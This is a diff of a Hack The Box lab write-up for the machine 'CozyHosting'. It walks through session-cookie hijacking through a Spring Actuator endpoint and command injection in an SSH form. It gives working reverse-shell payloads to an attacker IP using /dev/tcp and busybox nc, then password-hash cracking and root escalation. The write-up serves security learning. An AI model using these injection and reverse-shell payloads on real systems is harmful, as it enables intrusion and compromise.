@@ -1,9 +1,5 @@
----
-title: "Hack The Box - CozyHosting"
-date: 2024-03-17
----
 ## Description
-CozyHosting is an easy-difficulty Linux machine that features a `Spring Boot` application. The application has the `Actuator` endpoint enabled. Enumerating the endpoint leads to the discovery of a user's session cookie, leading to authenticated access to the main dashboard. The application is vulnerable to command injection, which is leveraged to gain a reverse shell on the remote machine. Enumerating the application's `JAR` file, hardcoded credentials are discovered and used to log into the local database. The database contains a hashed password, which once cracked is used to log into the machine as the user `josh`. The user is allowed to run `ssh` as `root`, which is leveraged to fully escalate privileges. 
+CozyHosting is an easy-difficulty Linux machine that features a `Spring Boot` application. The application has the `Actuator` endpoint enabled. Enumerating the endpoint leads to the discovery of a user's session cookie, leading to authenticated access to the main dashboard. The application is vulnerable to command injection, which is leveraged to gain a reverse shell on the remote machine. Enumerating the application's `JAR` file, hard-coded credentials are discovered and used to log into the local database. The database contains a hashed password, which once cracked is used to log into the machine as the user `josh`. The user is allowed to run `ssh` as `root`, which is leveraged to fully escalate privileges. 
 ## Information gathering
 Let's start by discovering the services running on the machine:
 ```
@@ -36,12 +32,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds
 ```
-The SSH server is OpenSSH 8.9p1 and the web server is nginx 1.18.0. It tried to redirect to cozyhosting.htb, that means that we would have to update our `/etc/hosts` file to redirect the domain name `cozyhosting.htb` to the IP address of the server:
+The SSH server is OpenSSH 8.9p1 and the web server is nginx 1.18.0. It tried to redirect to `cozyhosting.htb`, that means that we would have to update our `/etc/hosts` file to redirect the domain name `cozyhosting.htb` to the IP address of the server:
 ```
 #echo "10.129.103.86 cozyhosting.htb" >> /etc/hosts
 ```
-This is the website of Cozy Hosting, a company that offers "modern solutions for growing your business". Let's look at the home page in details. Using Wappalyzer, we can see that the site is running under nginx 1.18.0 on Ubuntu (nothing new here) and uses AOS and Swiper Javascript libraries. In the comment, we can see that FlexStart, a Bootstrap template, has been used and this template has been updated with the version 5.2.3 of Bootstrap.
-On the site, the home page is totally static but there is a login page accessible from a button at the top right of the page. On the login page, the template that has been used is NiceAdmin. The login page has two fields (Username and Password and a Remember me feature).
+This is the website of Cozy Hosting, a company that offers "modern solutions for growing your business". Let's look at the home page in details. Using `Wappalyzer`, we can see that the site is running under nginx 1.18.0 on Ubuntu (nothing new here) and uses AOS and `Swiper` JavaScript libraries. In the comment, we can see that `FlexStart`, a Bootstrap template, has been used, and this template has been updated with the version 5.2.3 of Bootstrap.
+On the site, the home page is totally static, but there is a login page accessible from a button at the top right of the page. On the login page, the template that has been used is `NiceAdmin`. The login page has two fields (Username and Password and a "Remember me" feature).
 We can now enumerate the potential hidden directories using gobuster:
 ```
 $gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirb/common.txt 
@@ -69,7 +65,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 2023/09/28 22:06:48 Finished
 ===============================================================
 ```
-There is an admin page that redirect to the login page. This also sets a cookie with a JSESSIONID. There is an error page that indicates that there is no mapping for `/error` and add the following error message: `There was an unexpected error (type=None, status=999).`. A quick search on Google about this error tells us this comes from a Spring application. We have already taken a look at the index and login pages. The logout page redirects to the login page.
+There is an admin page that redirect to the login page. This also sets a cookie with a `JSESSIONID`. There is an error page that indicates that there is no mapping for `/error` and add the following error message: `There was an unexpected error (type=None, status=999).`. A quick search on Google about this error tells us this comes from a Spring application. We have already taken a look at the index and login pages. The logout page redirects to the login page.
 I also tried to get the admin page using curl:
 ```
 $curl http://cozyhosting.htb/admin -v
@@ -98,7 +94,7 @@ $curl http://cozyhosting.htb/admin -v
 * Connection #0 to host cozyhosting.htb left intact
 {"timestamp":"2023-10-21T15:40:55.424+00:00","status":401,"error":"Unauthorized","path":"/admin"}
 ```
-We do not have a redirection to the login page but we can see there is a Basic auth and 401 error if the credentials are not correct.
+We do not have a redirection to the login page, but we can see there is a Basic auth and 401 error if the credentials are not correct.
 
 Let's search for other virtual hosts:
 ```
@@ -121,7 +117,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 2023/09/28 22:09:43 Finished
 ===============================================================
 ```
-Apparently, there is no other virtual hosts for this domain. But I did a more in-depth analysis because this is an hosting service so it is possible to have subdomains. I tried with a more complete wordlists:
+Apparently, there is no other virtual hosts for this domain. But I did a more in-depth analysis because this is a hosting service, so it is possible to have subdomains. I tried with a more complete wordlists:
 ```
 $ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://cozyhosting.htb/ -H 'Host: FUZZ.cozyhosting.htb' -fc 301
 
@@ -178,9 +174,9 @@ ________________________________________________
 :: Progress: [8295455/8295455] :: Job [1/1] :: 1352 req/sec :: Duration: [2:26:07] :: Errors: 58 ::
 ```
 
-Let's focus on the login page which seems the most promising attack vector. When you try to login using random credentials, you get an error "Invalid username or password". JavaScript avoids you to send a request without a login nor a password. Using OWASP ZAP, I tried to send the login request without a password or a login but I got the same error message.
+Let's focus on the login page which seems the most promising attack vector. When you try to log in using random credentials, you get an error "Invalid username or password". JavaScript avoids you to send a request without a login nor a password. Using OWASP ZAP, I tried to send the login request without a password or a login, but I got the same error message.
 
-I finally run an nmap analysis to get UDP open ports:
+I finally run a nmap analysis to get UDP open ports:
 ```
 $sudo nmap -sU -oN nmap_udp 10.129.176.167
 [sudo] password for pierre: 
@@ -227,9 +223,9 @@ PORT   STATE SERVICE
 |   /uir//etc/passwd: Possible D-Link router directory traversal vulnerability (CVE-2018-10822)
 |_  /uir//tmp/csman/0: Possible D-Link router plaintext password file exposure (CVE-2018-10824)
 ```
-There is indeed a CSRF vulnerability but I do not see how to exploit it here. The `http-enum` vulnerabilities found are not related to the website `cozyhosting.htb` and seems to be false positives to me.
+There is indeed a CSRF vulnerability, but I do not see how to exploit it here. The `http-enum` vulnerabilities found are not related to the website `cozyhosting.htb` and seems to be false positives to me.
 
-I also run searchsploit to find any known vulnerabilities but none seems to correspond to this version:
+I also run searchsploit to find any known vulnerabilities, but none seems to correspond to this version:
 ```
 $searchsploit nginx
 ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
@@ -257,31 +253,31 @@ Shellcodes: No Results
 
 We will now look at the login page in more details and use [login bypass techniques](https://book.hacktricks.xyz/pentesting-web/login-bypass) to identify a potential vulnerability:
  - Is there any comments in the page giving usernames or passwords? No.
- - Is it possible to access directly to the restricted pages? No. I tried to access to `/admin` and it redirects me to the login page.
+ - Is it possible to access directly to the restricted pages? No. I tried to access to `/admin`, and it redirects me to the login page.
  - Is it possible to send 0 or 1 parameters only? No. I already tried in the previous section and I got redirected to the login page with an error.
  - Is it possible to raise a PHP comparison error by using HTTP parameter array types? No. No error appears after setting `username` and `password` as array types.
  - Is it possible to send JSON data? No. I get the same redirection to the login page with an error.
  - Is it possible to raise a NodeJS parsing error? No, same redirection with same error.
  - Can we use default credentials? No particular technology seems to be used.
- - Does common combinations of login/password works? I used the fuzzer of OWASP ZAP and used a list of the 100 first usernames of `xato-net-10-million-usernames.txt` and the 100 passwords from `xato-net-10-million-passwords-100.txt`. I added also some usernames and passwords related to the website and the technology (nginx, cozyhosting with different wordings...). I also tried to add `@cozyhosting.htb` at the end of the username because the login page shows an `@` sign which may show that usernames are email addresses.
+ - Does common combinations of login/password works? I used the fuzzer of OWASP ZAP and used a list of the 100 first usernames of `xato-net-10-million-usernames.txt` and the 100 passwords from `xato-net-10-million-passwords-100.txt`. I added also some usernames and passwords related to the website and the technology (`nginx`, `cozyhosting` with different wordings...). I also tried to add `@cozyhosting.htb` at the end of the username because the login page shows an `@` sign which may show that usernames are email addresses.
  - Does sniffing the website provides valid credentials? I run `cewl` to get a list of words that I now use as potential login or passwords in the fuzzer of OWASP ZAP.
- - Can a more in-depth bruteforce provides valid credentials? I used ffuf:
+ - Can a more in-depth bruteforce provides valid credentials? I used `ffuf`:
  ```
  $ ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:USERNAME -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASSWORD -u http://cozyhosting.htb/login -X POST -d "username=USERNAME&password=PASSWORD" -H 'Content-Type: application/x-www-form-urlencoded' -fr "Invalid username or password" -ic  -r
  ```
  The website seems long to respond (around 8 requests per seconds) so bruteforce may not be the most promising attack vector. I run this command during 20 minutes with no results.
- - Is it vulnerable to SQL injection? No, I used a [list](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass) of malicious usernames or passwords. And I get always a 302 HTTP code with the same response headers.
- - Is it vulnerable to NoSQL injection? No, I tried to use some lists of NoSQL Injection payloads but I always get the same results.
+ - Is it vulnerable to SQL injection? No, I used a [list](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass) of malicious usernames or passwords. And I always get a 302 HTTP code with the same response headers.
+ - Is it vulnerable to NoSQL injection? No, I tried to use some lists of NoSQL Injection payloads, but I always get the same results.
  - Is it vulnerable to XPath injection? No, I also used a list of payloads that I used in OWASP ZAP and all the answers are the same.
  - Is it vulnerable to LDAP injection? No, using the same method as above.
- - Is the Remember Me feature exploitable? No, it just adds a "remember" POST parameter taking a boolean value (true or false). Changing it does not seem to change anything.
+ - Is the "Remember Me" feature exploitable? No, it just adds a "remember" POST parameter taking a boolean value (true or false). Changing it does not seem to change anything.
  - Is there an exploitable open redirection? No. When you try to go to the admin page, you are redirected to the login page and no parameter stores information about where to redirect.
  - Is it possible to enumerate usernames? No. The error message when the login fails does not mention if the username or the password is wrong and there is no "Forgot password" feature.
- However, by reading carefully the home page of the site, there is an email address: `info@cozyhosting.htb`. It is possible that `info` or `info@cozyhosting.htb` to be a valid username. It would be interesting to bruteforce using these values. I put both in a file and run a ffuf command:
+ However, by reading carefully the home page of the site, there is an email address: `info@cozyhosting.htb`. It is possible that `info` or `info@cozyhosting.htb` to be a valid username. It would be interesting to bruteforce using these values. I put both in a file and run a `ffuf` command:
  ```
  $ffuf -w usernames:USERNAME -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASSWORD -u http://cozyhosting.htb/login -X POST -d "username=USERNAME&password=PASSWORD" -H 'Content-Type: application/x-www-form-urlencoded' -fr "Invalid username or password" -ic  -r
  ```
- Because ffuf does not URL encode, I wrote `info%40cozyhosting.htb` in the `usernames` file. But I got no positive results.
+ Because `ffuf` does not URL encode, I wrote `info%40cozyhosting.htb` in the `usernames` file. But I got no positive results.
  Using OWASP ZAP, I also tried to find an injection vulnerability using these usernames but with no results.
  - Is there an auto-complete feature? No.
 
@@ -291,8 +287,8 @@ I also tried some of these cases on the `/admin` page using Basic authentication
 ```
 
 I also noticed that, after a login failed, you are redirected to `http://cozyhosting.htb/login?error`. The parameter `error` is used to get the error message under the login form. I tried to fuzz this GET parameter with `/usr/share/wordlists/dirb/common.txt` to see if another word could do something else but only `error` adds information to the page. Then, I tried with the word list `/usr/share/seclists/Miscellaneous/lang-english.txt`. No more results.
-### dhcpc
-To be honest, I do not really know what to do with this service. I do not find so much information on what vulnerabilities I could find for it so I will pass.
+### `dhcpc`
+To be honest, I do not really know what to do with this service. I do not find so much information on what vulnerabilities I could find for it, so I will pass.
 ### Spring
 There is a [page on Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators) related to Spring Actuators. An actuator provides predefined features to an application and can be discovered through the endpoint `/actuator`. We can see that some of them are available on the server:
 ```
@@ -333,10 +329,10 @@ There is a [page on Hacktricks](https://book.hacktricks.xyz/network-services-pen
   }
 }
 ```
-The `/sessions` endpoint tells us there is a session named "kanderson" with that looks like to a session ID. After modifying the current JSESSIONID in Firefox by this one, I am now able to access to the admin page.
-In the admin page, you have a list of the recent sales, the number of running softwares, and a form to add an host to automatic patching. Also, you have a warning saying that 3 hosts require attention.
-The form does a POST request to the endpoint `/executessh` with two parameters: `host` and `username`. Above the form, there is a message saying: "For Cozy Scanner to connect the private key that you received upon registration should be included in your host's .ssh/authorised_keys file." We can suppose the website execute an SSH query for the specified user.
-If we send `cozyhosting.htb` with the username `kanderson`, an error is raised: "Host key verification failed." It seems to mean that the user "kanderson" does not have the private key. We can check the host name is correct by sending a request with a bad hostname. In that case, you get the error: "ssh: Could not resolve hostname dsqqdsd: Temporary failure in name resolution". This is the error message provided by ssh. We can suppose this form is vulnerable to command injection. Meanwhile, we can try to bruteforce the username with:
+The `/sessions` endpoint tells us there is a session named `kanderson` with that looks like to a session ID. After modifying the current `JSESSIONID` in Firefox by this one, I am now able to access to the admin page.
+In the admin page, you have a list of the recent sales, the number of running applications, and a form to add a host to automatic patching. Also, you have a warning saying that 3 hosts require attention.
+The form does a POST request to the endpoint `/executessh` with two parameters: `host` and `username`. Above the form, there is a message saying: "For Cozy Scanner to connect the private key that you received upon registration should be included in your host's .ssh/authorized_keys file." We can suppose the website execute an SSH query for the specified user.
+If we send `cozyhosting.htb` with the username `kanderson`, an error is raised: "Host key verification failed." It seems to mean that the user `kanderson` does not have the private key. We can check the host name is correct by sending a request with a bad hostname. In that case, you get the error: "ssh: Could not resolve hostname dsqqdsd: Temporary failure in name resolution". This is the error message provided by ssh. We can suppose this form is vulnerable to command injection. Meanwhile, we can try to bruteforce the username with:
 ```
 $ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt:USERNAME -u http://cozyhosting.htb/executessh -X POST -d "host=cozyhosting.htb&username=USERNAME" -H 'Content-Type: application/x-www-form-urlencoded' -fr "Host key verification failed" -ic -r
 ```
@@ -373,7 +369,7 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 < 
 * Connection #0 to host cozyhosting.htb left intact
 ```
-I used to `-v` option to see the request and the response. In the response, we can see the error that is returned in the `Location` header: "Host key verification failed". To find a command injection, I will try to add a `;` in one of the fields to check what happens. Indeed, `;` is the command separator for shell commands. Let's see what happens for the `host` parameter:
+I used to `-v` option to see the request and the response. In the response, we can see the error that is returned to the `Location` header: "Host key verification failed". To find a command injection, I will try to add a `;` in one of the fields to check what happens. Indeed, `;` is the command separator for shell commands. Let's see what happens for the `host` parameter:
 ```
 $curl 'http://cozyhosting.htb/executessh' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'host=cozyhosting.htb;&username=kanderson' -v 2> >( grep Location )
 < Location: http://cozyhosting.htb/admin?error=Invalid hostname!
@@ -383,7 +379,7 @@ The error is now "Invalid hostname". It seems there is a kind of validation of t
 $curl 'http://cozyhosting.htb/executessh' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'host=cozyhosting.htb&username=kanderson;' -v 2> >( grep Location )
 < Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname kanderson: Temporary failure in name resolution/bin/bash: line 1: @cozyhosting.htb: command not found
 ```
-This time, we got an ssh error and a bash error. It seems that ssh try to connect to `kanderson` which is the username, and try to run the bash command `@cozyhosting.htb` which is the hostname preceeded by an `@`. We can suppose that the command that is executed has the following format: `ssh <username>@<hostname>`. To check that, let's try to craft the command `ssh kanderson;id;@cozyhosting.htb` in order to get the command `id` executed:
+This time, we got an ssh error and a bash error. It seems that ssh try to connect to `kanderson` which is the username, and try to run the bash command `@cozyhosting.htb` which is the hostname preceded by an `@`. We can suppose that the command that is executed has the following format: `ssh <username>@<hostname>`. To check that, let's try to craft the command `ssh kanderson;id;@cozyhosting.htb` in order to get the command `id` executed:
 ```
 $curl 'http://cozyhosting.htb/executessh' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'host=cozyhosting.htb&username=kanderson;id;' -v 2> >( grep Location )
 < Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname kanderson: Temporary failure in name resolution/bin/bash: line 1: @cozyhosting.htb: command not found
@@ -398,7 +394,7 @@ Unfortunately, it seems there is a verification of the `username` parameter. It 
 $curl 'http://cozyhosting.htb/executessh' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'host=cozyhosting.htb&username=kanderson;sh${IFS}-i${IFS}>%26${IFS}/dev/tcp/10.10.14.109/4444${IFS}0>%261;' -v  2> >( grep Location )
 < Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname kanderson: Temporary failure in name resolution/bin/bash: line 1: ${IFS}/dev/tcp/10.10.14.109/4444${IFS}0: ambiguous redirect/bin/bash: line 1: @cozyhosting.htb: command not found
 ```
-This time, we have an error from the bash: "/bin/bash: line 1: ${IFS}/dev/tcp/10.10.14.109/4444${IFS}0: ambiguous redirect". It seems that the redirection is not correctly understood by bash because of the `${IFS}`. Let's try another reverse shell that does not contains any redirection, like `busybox nc 10.10.14.109 4444 -e sh`:
+This time, we have an error from the bash: "/bin/bash: line 1: ${IFS}/dev/tcp/10.10.14.109/4444${IFS}0: ambiguous redirect". It seems that the redirection is not correctly understood by bash because of the `${IFS}`. Let's try another reverse shell that does not contain any redirection, like `busybox nc 10.10.14.109 4444 -e sh`:
 ```
 $curl 'http://cozyhosting.htb/executessh' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'host=cozyhosting.htb&username=kanderson;busybox${IFS}nc${IFS}10.10.14.109${IFS}4444${IFS}-e${IFS}sh;' -v  2> >( grep Location )
 ```
@@ -414,7 +410,7 @@ cozyhosting
 ```
 I can start to look for the flag after setting a better shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
 ## Target machine enumeration
-First of all, let's look at the flag which is generally located in the home folder of one of the users of the machine:
+First, let's look at the flag which is generally located in the home folder of one of the users of the machine:
 ```
 app@cozyhosting:/app$ ls -l /home
 ls -l /home
@@ -424,7 +420,7 @@ app@cozyhosting:/app$ ls -l /home/josh
 ls -l /home/josh
 ls: cannot open directory '/home/josh': Permission denied
 ```
-There is a user named `josh` but we do not have the permissions to read inside his home folder.
+There is a user named `josh`, but we do not have the permissions to read inside his home folder.
 
 The user `josh` is running no processes:
 ```
@@ -495,13 +491,13 @@ postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
 josh:x:1003:1003::/home/josh:/usr/bin/bash
 _laurel:x:998:998::/var/log/laurel:/bin/false
 ```
-We can see that the `app` user seems to be have a home but it seems to not exist:
+We can see that the `app` user seems to have a home, but it seems to not exist:
 ```
 ls /home/app
 ls: cannot access '/home/app': No such file or directory
 ```
 
-But there is the jar file of the application available in `/app`. Let's unzip it and look for intersting stuff:
+But there is the jar file of the application available in `/app`. Let's unzip it and look for interesting stuff:
 ```
 app@cozyhosting:/tmp/jar$ unzip /app/cloudhosting-0.0.1.jar
 unzip /app/cloudhosting-0.0.1.jar
@@ -639,7 +635,7 @@ n
 
 (END)
 ```
-We now have two blowfish hashes. Let's run hashcat on them to find potential passwords:
+We now have two `blowfish` hashes. Let's run `hashcat` on them to find potential passwords:
 ```
 $hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt
 ```
@@ -725,12 +721,12 @@ root.txt
 ## Learning from other writeups
 ### Official writeup
 In the official writeup, after enumerating the pages available on the website and getting the information that it is a Spring Boot application, they did another enumeration using a Spring Boot wordlist. In my case, I got lucky because I directly looked at the Actuator endpoint. I could miss some other endpoints. Using a dedicated wordlist can find other pages.
-Then, to test there is indeed a command injection, they started a web server locally and sent a `curl` command to this server. This is easier than directly doing a reverse shell because reverse shell commands can be a little bit tricky sometimes (as we saw before with the rediction issue). More interesting, they used this web server to download a reverse shell script on the server and then run it. Again, this avoids running complex commands: you just have two commands, one dowloading the reverse shell with `curl`, and one executing it with `bash`.
-Finally, the SSH command used to get a root shell seems much more simpler to me. They used the options `PermitLocalCommand` and `LocalCommand` that run a local command after a successful connection.
+Then, to test there is indeed a command injection, they started a web server locally and sent a `curl` command to this server. This is easier than directly doing a reverse shell because reverse shell commands can be a bit tricky sometimes (as we saw before with the reduction issue). More interesting, they used this web server to download a reverse shell script on the server and then run it. Again, this avoids running complex commands: you just have two commands, one downloading the reverse shell with `curl`, and one executing it with `bash`.
+Finally, the SSH command used to get a root shell seems much simpler to me. They used the options `PermitLocalCommand` and `LocalCommand` that run a local command after a successful connection.
 ### 0xdf writeup
 In [0xdf writeup](https://0xdf.gitlab.io/2024/03/02/htb-cozyhosting.html), they found another way in the command injection to avoid spaces in the username: they used [brace expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html).
 Then, as in the official writeup, they used a command different than me to upgrade the shell: `script /dev/null -c bash`. This is interesting in case Python is not installed on the machine. I will add this command into my cheat sheet.
-When I wanted to analyze the jar file, I first tried to send it to my machine using `scp`. `scp` is using SSH to transfer files. However, it seems there is a firewall preventing outgoing SSH connections. So it failed. In this writeup, they used `nc` to transfer the file. This is a better choice as you can also selecting which will be the port to use to avoid the firewall. Then, after transfering the jar file, they used a Java decompiler ([JD-GUI](https://java-decompiler.github.io/)) to analyze it.
+When I wanted to analyze the jar file, I first tried to send it to my machine using `scp`. `scp` is using SSH to transfer files. However, it seems there is a firewall preventing outgoing SSH connections. So it failed. In this writeup, they used `nc` to transfer the file. This is a better choice as you can also select which will be the port to use to avoid the firewall. Then, after transferring the jar file, they used a Java decompiler ([JD-GUI](https://java-decompiler.github.io/)) to analyze it.
 To determine the hash type, I deduced it from the first characters `$2a$`. In this writeup, they used `hashcat` to do it, and in the official writeup, they used `hashid`. Maybe it can be interesting to verify the type of hash before running a brute-force just in case I am wrong when I deduce it.
 ## Lessons learned
 I lost a lot of time in my vulnerability analysis because I missed one crucial point during the information gathering: I did not look at the error page in details. Indeed, the error page tells us that the website is using the framework Spring which is vulnerable if the Actuator endpoint is enabled. By missing this part, I spent a lot of time by looking everything else. Note for the future: always look at the error pages/messages.
